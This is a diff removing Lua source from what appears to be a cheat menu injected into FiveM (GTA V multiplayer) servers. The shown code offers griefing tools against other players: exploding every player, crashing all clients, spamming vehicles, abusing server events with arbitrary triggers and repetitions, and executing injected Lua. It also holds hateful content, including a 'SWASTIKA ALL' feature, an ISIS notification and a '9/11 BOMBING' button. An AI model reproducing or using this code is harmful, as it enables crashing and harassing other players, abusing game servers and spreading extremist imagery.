-                    local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                    for id, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            FM:GetFunction("AddExplosion")(FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
-                        end
-                    end
-                end)
-
-                FM:AddNotification("INFO", "ISIS Has entered the building!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("TURN ALL CARS INTO RAMPS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ramp_all_cars") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                CreateThread(function()
-                    FM:RequestModelSync("stt_prop_stunt_track_dwslope30")
-
-                    for vehicle in FM:EnumerateVehicles() do
-                        if vehicle ~= _veh or FM.Config.OnlineIncludeSelf then
-                            local ramp = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("stt_prop_stunt_track_dwslope30"), 0, 0, 0, true, true, true)
-                            FM:DoNetwork(ramp)
-                            FM:GetFunction("NetworkRequestControlOfEntity")(vehicle)
-                            FM:RequestControlOnce(vehicle)
-                            FM:RequestControlOnce(ramp)
-
-                            if FM:GetFunction("DoesEntityExist")(vehicle) then
-                                FM:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
-                            end
-                        end
-
-                        Wait(50)
-                    end
-                end)
-
-                FM:AddNotification("INFO", "Turned all cars into ramps!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("TURN ALL CARS INTO FIB BUILDING", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fib_all_cars") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                CreateThread(function()
-                    for vehicle in FM:EnumerateVehicles() do
-                        if vehicle ~= _veh or FM.Config.OnlineIncludeSelf then
-                            local building = FM:GetFunction("CreateObject")(-1404869155, 0, 0, 0, true, true, true)
-                            FM:DoNetwork(ramp)
-                            FM:GetFunction("NetworkRequestControlOfEntity")(vehicle)
-                            FM:RequestControlOnce(vehicle)
-                            FM:RequestControlOnce(building)
-
-                            if FM:GetFunction("DoesEntityExist")(vehicle) then
-                                FM:GetFunction("AttachEntityToEntity")(building, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
-                            end
-                        end
-
-                        Wait(50)
-                    end
-                end)
-
-                FM:AddNotification("INFO", "Turned all cars into FIB Buildings!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("DELETE VEHICLES", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles") then
-            FM:AddNotification("INFO", "Deleting cars!", 10000)
-            FM:DeleteVehicles()
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("VEHICLE SPAM SERVER", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_spam_server") then
-            FM:CarSpamServer()
-
-            if not FM.Config.SafeMode then
-                FM:AddNotification("INFO", "Unlimited vehicles!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("SWASTIKA ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "swastika_all") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                CreateThread(function()
-                    for id, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            local ped = FM:GetFunction("GetPlayerPed")(src)
-
-                            if FM:GetFunction("DoesEntityExist")(ped) then
-                                FM.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](FM:GetFunction("IsPedInAnyVehicle")(ped) and FM:GetFunction("GetVehiclePedIsIn")(ped) or ped)
-                                Wait(1000)
-                            end
-                        end
-                    end
-                end)
-
-                FM:AddNotification("INFO", "Swastikas for all!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("GAS ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "gas_all") then
-            if FM.Config.SafeMode then
-                return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                CreateThread(function()
-                    for id, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            local ped = FM:GetFunction("GetPlayerPed")(src)
-
-                            if FM:GetFunction("DoesEntityExist")(ped) then
-                                FM:GasPlayer(src)
-                                Wait(1000)
-                            end
-                        end
-                    end
-                end)
-
-                FM:AddNotification("INFO", "All players gassed!", 10000)
-            end
-        end
-
-        curY = curY + 25
-        if self.DynamicTriggers["CarryPeople"] and self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"] then
-            if self.Painter:Button("CARRY ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "carry_all") then
-                if FM.Config.SafeMode then
-                    return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-                else
-                    TriggerServerEvent(self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"], -1, "misfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, -1, 100000, 0.0, 49, 33, 1)
-                    FM:AddNotification("INFO", "Carrying all players!", 10000)
-                end
-            end
-
-            curY = curY + 25
-        end
-
-        if self.Painter:Button("~r~CRASH ALL (SHIFT FOR METHOD)", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crash_all") then
-            if FM.Config.SafeMode then
-                return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                local method = nil
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                    local _method = FM:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
-
-                    if _method then
-                        method = _method
-                        FM:AddNotification("INFO", "Using " .. method .. " crash method.")
-                    end
-                end
-
-                CreateThread(function()
-                    for id, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            local ped = FM:GetFunction("GetPlayerPed")(src)
-
-                            if FM:GetFunction("DoesEntityExist")(ped) then
-                                FM:CrashPlayer(src, true, method)
-                                Wait(500)
-                            end
-                        end
-                    end
-                end)
-
-                FM:AddNotification("INFO", "Crashing all players!", 10000)
-            end
-        end
-    end)
-
-    local was_godmode
-    local was_boosted
-
-    function FM:DoVehicleRelated()
-        local curVeh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-        if not FM:GetFunction("DoesEntityExist")(curVeh) then return end
-
-        if self.Config.Vehicle.BulletProofTires then
-            FM:GetFunction("SetVehicleTyresCanBurst")(curVeh, false)
-            was_bulletproof = true
-        elseif was_bulletproof then
-            FM:GetFunction("SetVehicleTyresCanBurst")(curVeh, true)
-            was_bulletproof = false
-        end
-
-        if self.Config.Vehicle.GodMode then
-            FM:GetFunction("SetEntityInvincible")(curVeh, true)
-
-            if FM:GetFunction("IsVehicleDamaged")(curVeh) then
-                FM:GetFunction("SetVehicleFixed")(curVeh)
-            end
-
-            was_godmode = true
-        elseif was_godmode then
-            FM:GetFunction("SetEntityInvincible")(curVeh, false)
-            was_godmode = false
-        end
-
-        if self.Config.Vehicle.Boost > 1.0 then
-            FM:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, self.Config.Vehicle.Boost + 1.0)
-            was_boosted = true
-        elseif was_boosted then
-            FM:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, 1.0)
-            was_boosted = false
-        end
-    end
-
-    FM:AddCategory("Freecam", function(self, x, y)
-        local curY = 5
-
-        if self.Painter:CheckBox("FREECAM", self.FreeCam.On, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam") then
-            self.FreeCam.On = not self.FreeCam.On
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 20
-
-        if self.Painter:ListChoice("FREECAM MODE: ", self.FreeCam.ModeNames, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam_mode") then
-            self.FreeCam.Mode = list_choices["freecam_mode"].selected
-            self.FreeCam.DraggingEntity = nil
-            lift_height = 0.0
-            lift_inc = 0.1
-            FM.ConfigClass.Save(true)
-        end
-    end)
-
-    FM:AddCategory("World", function(self, x, y)
-        local curY = 0
-        if self.Painter:Button("9/11 BOMBING", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "9_11_bombing") then end -- Fuck you
-    end)
-
-    local keys = {"TAB", "MOUSE3", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
-    local disable_keys = {"-", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
-    local freecam_keys = {"HOME", "MOUSE3", "TAB", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
-    local rccar_keys = {"=", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
-    local aimbot_keys = {"MOUSE1", "MOUSE2", "MOUSE3", "LEFTALT", "LEFTSHIFT", "MOUSE2", "SPACE", "C", "X", "Z", "V", "F", "G", "H", "E", "R", "Q", "T", "Y", "U", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
-
-    local function _run_lua(resource, trigger)
-        local args = FM:GetTextInput("Enter Arguments.", "", 100)
-        local _args
-
-        if not args or args == "" then
-            _args = {}
-        else
-            local e, r = load("return {" .. args .. "}")
-
-            if e then
-                _args = e()
-            else
-                FM:AddNotification("ERROR", "Execution failed. See console for details.")
-                FM:Print("[LUA] Execution Failed (Arguments): ^1" .. r .. "^7")
-            end
-        end
-
-        if dict.type(_args) == "table" then
-            local amount = FM:GetTextInput("Enter repetitions.", 1, 10)
-
-            if not amount or dict.tonumber(amount) then
-                amount = 1
-            end
-
-            amount = dict.tonumber(amount)
-            local _type = FM:GetTextInput("Enter method. [CL/SV]", "SV", 2)
-
-            if _type == "CL" then
-                for i = 1, amount do
-                    FM:GetFunction("TriggerEvent")(((not resource) and trigger or (FM.DynamicTriggers[resource][trigger])), _args)
-                end
-
-                FM:AddNotification("INFO", "[CL] Running " .. ((not resource) and trigger or (FM.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")
-            elseif _type == "SV" then
-                for i = 1, amount do
-                    FM:GetFunction("TriggerServerEvent")(((not resource) and trigger or (FM.DynamicTriggers[resource][trigger])), _args)
-                end
-
-                FM:AddNotification("INFO", "[SV] Running " .. ((not resource) and trigger or (FM.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")
-            else
-                FM:AddNotification("ERROR", "Bad type.")
-            end
-        end
-    end
-
-    FM:AddCategory("Lua", function(self, x, y)
-        local curY = 0
-
-        for resource, events in dict.pairs(self.DynamicTriggers) do
-            for trigger, real in dict.pairs(events) do
-                local _trigger = self.Painter:Button(trigger, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "dynamic_trigger_" .. trigger)
-
-                if _trigger then
-                    _run_lua(resource, trigger)
-                end
-
-                curY = curY + 25
-            end
-        end
-
-        if self.Painter:CheckBox("SHOW KEYS PRESSED", self.Config.ShowControlsOnScreen, x, y, 5, self.MenuH - 105, 200, 20, 255, 255, 255, 255, "onscreen_controls", false, 0.38) then
-            FM.Config.ShowControlsOnScreen = not FM.Config.ShowControlsOnScreen
-        end
-
-        local custom = self.Painter:Button("EXECUTE TRIGGER", x, y, 5, self.MenuH - 80, 200, 20, 255, 255, 255, 255, "execute_custom")
-
-        if custom then
-            local event = self:GetTextInput("Enter trigger.", "", 100)
-
-            if event and event ~= "" then
-                _run_lua(nil, event)
-            end
-        end
-
-        local custom_lua = self.Painter:Button("EXECUTE LUA", x, y, 545, self.MenuH - 80, 200, 20, 255, 255, 255, 255, "execute_custom_lua")
-
-        if custom_lua then
-            local code = self:GetTextInput("Enter lua code.", "", 2000)
-
-            if code then
-                local e, r = load(code)
-
-                if e then
-                    e()
-                else
-                    FM:AddNotification("ERROR", "Execution failed. See console for details.")
-                    FM:Print("[LUA] Execution Failed: ^1" .. r .. "^7")
-                end
-            end
-        end
-    end)
-
-    local selected_config = "none"
-
-    FM:AddCategory("Misc", function(self, x, y, w, h)
-        local curY = 5
-        local _width = self.Painter:GetTextWidth("Your build does not support to use of configs.", 4, 0.4)
-        if _Executor ~= "redENGINE" then return self.Painter:DrawText("Your build does not support to use of configs.", 4, true, x + _width, self.Config.MenuY + 100, 0.4, 255, 255, 255, 255) end
-        _width = self.Painter:GetTextWidth("CURRENT CONFIG: ~y~" .. current_config:upper(), 4, 0.4)
-        self.Painter:DrawText("CURRENT CONFIG: ~y~" .. current_config:upper(), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
-        curY = curY + 25
-        _width = self.Painter:GetTextWidth("SELECTED: ~y~" .. selected_config:upper(), 4, 0.4)
-        self.Painter:DrawText("SELECTED: ~y~" .. selected_config:upper(), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
-        curY = curY + 25
-        local cl_w = self.Painter:GetTextWidth("NEW CONFIG", 4, 0.4)
-
-        if self.Painter:Button("NEW CONFIG", x, y, 545, self.MenuH - 80, cl_w, 20, 255, 255, 255, 255, "new_config") then
-            selected_config = "none"
-            local name = FM:GetTextInput("Enter the name of the new config.", "", 50)
-
-            if name then
-                if not name:find("fm_") then
-                    name = "fm_" .. name
-                end
-
-                FM.List[name] = _count(FM.List) + 1
-                FM:SetConfigList()
-                FM.ConfigClass.Write(name, FM.DefaultConfig)
-                FM:AddNotification("SUCCESS", "Config created.", 10000)
-            end
-        end
-
-        for name, cfg in dict.pairs(FM.List) do
-            if self.Painter:Button("CONFIG: ~y~" .. name:upper(), x, y, 5, curY, 200, 20, 255, 255, 255, 255, "config_" .. name) then
-                selected_config = name
-            end
-
-            if selected_config == name then
-                local curX = 5
-                local l_w = self.Painter:GetTextWidth("LOAD", 4, 0.4)
-
-                if self.Painter:Button("LOAD", x, y, curX, self.MenuH - 80, l_w, 20, 255, 255, 255, 255, "load_config") then
-                    selected_config = "none"
-                    current_config = name
-                    FM.ConfigClass.Load()
-                end
-
-                curX = curX + l_w + 5
-                local r_w = self.Painter:GetTextWidth("RESET", 4, 0.4)
-
-                if self.Painter:Button("RESET", x, y, curX, self.MenuH - 80, r_w, 20, 255, 255, 255, 255, "reset_config") then
-                    selected_config = "none"
-                    FM.ConfigClass:Write(name, FM.DefaultConfig)
-                    FM:AddNotification("SUCCESS", "Config reset.", 10000)
-                end
-
-                curX = curX + r_w + 5
-                local c_w = self.Painter:GetTextWidth("CLONE", 4, 0.4)
-
-                if self.Painter:Button("CLONE", x, y, curX, self.MenuH - 80, c_w, 20, 255, 255, 255, 255, "clone_config") then
-                    selected_config = "none"
-                    local name = FM:GetTextInput("Enter the name of the config.", "", 50)
-
-                    if name then
-                        if not name:find("fm_") then
-                            name = "fm_" .. name
-                        end
-
-                        FM.List[name] = _count(FM.List) + 1
-                        FM:SetConfigList()
-                        FM.ConfigClass.Write(name, FM.Config)
-                        FM:AddNotification("SUCCESS", "Config cloned.", 10000)
-                    end
-                end
-
-                curX = curX + c_w + 5
-                local rn_w = self.Painter:GetTextWidth("RENAME", 4, 0.4)
-
-                if self.Painter:Button("RENAME", x, y, curX, self.MenuH - 80, rn_w, 20, 255, 255, 255, 255, "rename_config") then
-                    local old_name = name
-                    local new_name = FM:GetTextInput("Enter the name of the config.", "", 50)
-
-                    if new_name then
-                        if not new_name:find("fm_") then
-                            new_name = "fm_" .. new_name
-                        end
-
-                        selected_config = new_name
-                        FM.List[new_name] = FM.List[old_name] or (_count(FM.List) + 1)
-                        FM.List[old_name] = nil
-                        FM:SetConfigList()
-                        FM.ConfigClass.Rename(old_name, new_name)
-                        FM:AddNotification("SUCCESS", "Config renamed.", 10000)
-                    end
-                end
-
-                curX = curX + rn_w + 5
-                local d_w = self.Painter:GetTextWidth("DELETE", 4, 0.4)
-
-                if self.Painter:Button("DELETE", x, y, curX, self.MenuH - 80, d_w, 20, 255, 255, 255, 255, "delete_config") then
-                    selected_config = "none"
-                    current_config = "fm_default"
-                    FM.List[name] = nil
-                    FM.ConfigClass.Delete(name)
-                    FM:SetConfigList()
-                    FM.ConfigClass.Load()
-                    FM:AddNotification("SUCCESS", "Config deleted.", 10000)
-                end
-            end
-
-            curY = curY + 25
-        end
-    end)
-
-    function FM:IndexOf(table, val)
-        for k, v in dict.pairs(table) do
-            if v == val or k == val then return (v == val and k) or v end
-        end
-
-        return -1
-    end
-
-    FM:AddCategory("Settings", function(self, x, y)
-        local curY = 5
-
-        if self.Painter:CheckBox("SHOW SCREEN ELEMENTS", self.Config.ShowText, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "text_settings_enabled", false) then
-            self.Config.ShowText = not self.Config.ShowText
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("MENU SOUNDS", self.Config.UseSounds, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "menu_sounds", false) then
-            self.Config.UseSounds = not self.Config.UseSounds
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("AUTO MOVE WITH MENU OPEN", self.Config.UseAutoWalk, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "auto_walk_enabled", false) then
-            self.Config.UseAutoWalk = not self.Config.UseAutoWalk
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("AUTO MOVE WITH FREECAM / RC CAR", self.Config.UseAutoWalkAlt, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "auto_walk_alt_enabled", false) then
-            self.Config.UseAutoWalkAlt = not self.Config.UseAutoWalkAlt
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("SAFE MODE", self.Config.SafeMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "safe_mode", false) then
-            self.Config.SafeMode = not self.Config.SafeMode
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("DRAW BACKGROUND IMAGE", self.Config.UseBackgroundImage, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "use_bg_image", false) then
-            self.Config.UseBackgroundImage = not self.Config.UseBackgroundImage
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("USE PRINT MESSAGES", self.Config.UsePrintMessages, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "use_print_images", false) then
-            self.Config.UsePrintMessages = not self.Config.UsePrintMessages
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 20
-
-        if self.Painter:ListChoice("TOGGLE KEY: ", keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "toggle_key", FM:IndexOf(keys, self.Config.ShowKey)) then
-            self.Config.ShowKey = keys[list_choices["toggle_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("DISABLE KEY: ", disable_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "disable_key", FM:IndexOf(disable_keys, self.Config.DisableKey), "DisableKey") then
-            self.Config.DisableKey = disable_keys[list_choices["disable_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("FREECAM KEY: ", freecam_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam_key", FM:IndexOf(freecam_keys, self.Config.FreeCamKey), "FreeCamKey") then
-            self.Config.FreeCamKey = freecam_keys[list_choices["freecam_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("RC CAR CAM KEY: ", rccar_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rccar_key", FM:IndexOf(rccar_keys, self.Config.RCCamKey), "RCCamKey") then
-            self.Config.RCCamKey = rccar_keys[list_choices["rccar_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("AIMBOT KEY: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_key", FM:IndexOf(aimbot_keys, self.Config.Player.AimbotKey)) then
-            self.Config.Player.AimbotKey = aimbot_keys[list_choices["aimbot_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("AIMBOT RELEASE KEY: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_release_key", FM:IndexOf(aimbot_keys, self.Config.Player.AimbotReleaseKey), "AimbotReleaseKey") then
-            self.Config.Player.AimbotReleaseKey = aimbot_keys[list_choices["aimbot_release_key"].selected]
-            FM.ConfigClass.Save(true)
-        end
-    end)
-
-    FM:AddCategory("~r~KILL", function(self, x, y)
-        FM.Showing = false
-        FM.FreeCam.On = false
-        FM.RCCar.On = false
-
-        FM.Config = {
-            Player = {},
-            Vehicle = {}
-        }
-
-        FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-        FM.Enabled = false
-        FM:GetFunction("DestroyCam")(FM.FreeCam.Cam)
-        FM:GetFunction("DestroyCam")(FM.RCCar.Cam)
-        FM:GetFunction("DestroyCam")(FM.SpectateCam)
-        FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-        FM:DoBlips(true)
-    end)
-
-    local scroller_pos
-    local scroller_size
-    local old_scroller
-    local cur_count
-    local scroller_max
-
-    function FM:GetScrollBasis(count)
-        if count <= 30 then
-            return 1.0
-        elseif count <= 40 then
-            return 1.1
-        elseif count <= 50 then
-            return 1.66
-        elseif count <= 60 then
-            return 2.22
-        elseif count <= 70 then
-            return 2.77
-        elseif count <= 80 then
-            return 3.33
-        elseif count <= 90 then
-            return 3.88
-        elseif count <= 100 then
-            return 4.45
-        elseif count <= 110 then
-            return 5.0
-        else
-            return count / 13.18
-        end
-    end
-
-    local halt
-
-    local title_color = {
-        r = 255,
-        g = 255,
-        b = 255
-    }
-
-    local mode = 1
-
-    local function _do_title_color()
-        if mode == 1 then
-            local r, g, b = _lerp(0.025, title_color.r, FM.Tertiary[1]), _lerp(0.025, title_color.g, FM.Tertiary[2]), _lerp(0.025, title_color.b, FM.Tertiary[3])
-
-            if dict.math.abs(FM.Tertiary[1] - r) <= 3 and dict.math.abs(FM.Tertiary[2] - g) <= 3 and dict.math.abs(FM.Tertiary[3] - b) <= 3 then
-                mode = 2
-            end
-
-            title_color.r = r
-            title_color.g = g
-            title_color.b = b
-        elseif mode == 2 then
-            local r, g, b = _lerp(0.025, title_color.r, 255), _lerp(0.025, title_color.g, 255), _lerp(0.025, title_color.b, 255)
-
-            if dict.math.abs(255 - r) <= 3 and dict.math.abs(255 - g) <= 3 and dict.math.abs(255 - b) <= 3 then
-                mode = 1
-            end
-
-            title_color.r = r
-            title_color.g = g
-            title_color.b = b
-        end
-    end
-
-    function FM:DrawMenu()
-        _do_title_color()
-
-        if self.Painter:Holding(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar") then
-            FM:GetFunction("SetMouseCursorSprite")(4)
-            local x, y = self:TranslateMouse(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar")
-            self.Config.MenuX = x
-            self.Config.MenuY = y
-        elseif was_dragging == "drag_bar" then
-            self.DraggingX = nil
-            self.DraggingY = nil
-            was_dragging = nil
-            FM.ConfigClass.Save(true)
-        end
-
-
-        if self.Config.NotifX and self.Config.NotifY and self.Config.NotifW then
-            if self.Painter:Holding(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif") then
-                FM:GetFunction("SetMouseCursorSprite")(4)
-                local x, y = self:TranslateMouse(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif")
-                self.Config.NotifX = x
-                self.Config.NotifY = y
-            elseif was_dragging == "drag_notif" then
-                self.DraggingX = nil
-                self.DraggingY = nil
-                was_dragging = nil
-                FM.ConfigClass.Save(true)
-            end
-        end
-
-        self:LimitRenderBounds()
-
-        if self.Config.UseBackgroundImage then
-            self.Painter:DrawSprite(self.Config.MenuX + (self.MenuW / 2), self.Config.MenuY + (self.MenuH / 2), self.MenuW, self.MenuH, 0.0, "fm", "menu_bg", 255, 255, 255, 255, true)
-        end
-
-        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY - 38, 90, 33, 10, 10, 10, 200)
-        self.Painter:DrawText(self.Name, 4, false, self.Config.MenuX + 2, self.Config.MenuY - 37, 0.4, dict.math.ceil(title_color.r), dict.math.ceil(title_color.g), dict.math.ceil(title_color.b), 255)
-        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, self.MenuH, 0, 0, 0, 200)
-        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, 18, 30, 30, 30, 200)
-        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY + 16, self.MenuW, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])
-        self.Painter:DrawRect(self.Config.MenuX + 5, self.Config.MenuY + 23, 515 + 113, self.MenuH - 28, 10, 10, 10, 200)
-        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 103, 280, self.MenuH - 108, 10, 10, 10, 200)
-        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 65, 280, 35, 10, 10, 10, 200)
-        self.Painter:DrawRect(self.Config.MenuX + 520 + 113, self.Config.MenuY + 23, 283, 39, 10, 10, 10, 200)
-        local list_pos = {}
-
-        if not self.Util:ValidPlayer(self.SelectedPlayer) then
-            self.Painter:DrawText("Online Players: " .. #FM.PlayerCache, 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 68, 0.35, 255, 255, 255, 255)
-
-            if not scroller_pos then
-                scroller_pos = 0
-            end
-
-            local plyY = self.Config.MenuY + 101 - scroller_pos * self:GetScrollBasis(#FM.PlayerCache)
-            scroller_max = self.MenuH - 120
-            scroller_size = old_scroller or scroller_max
-
-            if cur_count ~= #FM.PlayerCache then
-                scroller_size = scroller_max
-                old_scroller = nil
-            end
-
-            local _players = FM.PlayerCache
-            table.sort(_players, sort_func)
-
-            for id, src in dict.pairs(_players) do
-                table.insert(list_pos, {
-                    id = id,
-                    src = src,
-                    pos = dict.math.abs(self.Config.MenuY + 101 - plyY)
-                })
-
-                local color = {255, 255, 255}
-
-                if friends[FM:GetFunction("GetPlayerServerId")(src)] then
-                    color = {55, 200, 55}
-                end
-
-                if plyY >= (self.Config.MenuY + 92) and plyY <= (self.Config.MenuY + self.MenuH - 30) then
-                    if self.Painter:Button("ID: " .. FM:GetFunction("GetPlayerServerId")(src) .. " | Name: " .. FM:CleanName(FM:GetFunction("GetPlayerName")(src)), self.Config.MenuX + 525 + 113, plyY, 5, 5, nil, 20, color[1], color[2], color[3], 255, "player_" .. id, false, 0.35) then
-                        self.SelectedPlayer = src
-                    end
-                else
-                    if not old_scroller then
-                        scroller_size = self:Clamp(scroller_size - 23, 50, scroller_max)
-                    end
-                end
-
-                plyY = plyY + 23
-            end
-
-            halt = false
-
-            if not old_scroller then
-                old_scroller = scroller_size
-            end
-
-            if not cur_count then
-                cur_count = #FM.PlayerCache
-            end
-
-            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108, 8, self.MenuH - 120, 20, 20, 20, 255)
-            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])
-
-            if self.Painter:Hovered(self.Config.MenuX + 5 + 100 + 5 + 415 + 113, self.Config.MenuY + 103, 280, self.MenuH - 108) then
-                if FM:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELDOWN"]) then
-                    scroller_pos = scroller_pos + 8
-                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
-                elseif FM:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELUP"]) then
-                    scroller_pos = scroller_pos - 8
-                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
-                end
-            end
-
-            if self.Painter:Holding(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, "scroll_bar") then
-                FM:GetFunction("SetMouseCursorSprite")(4)
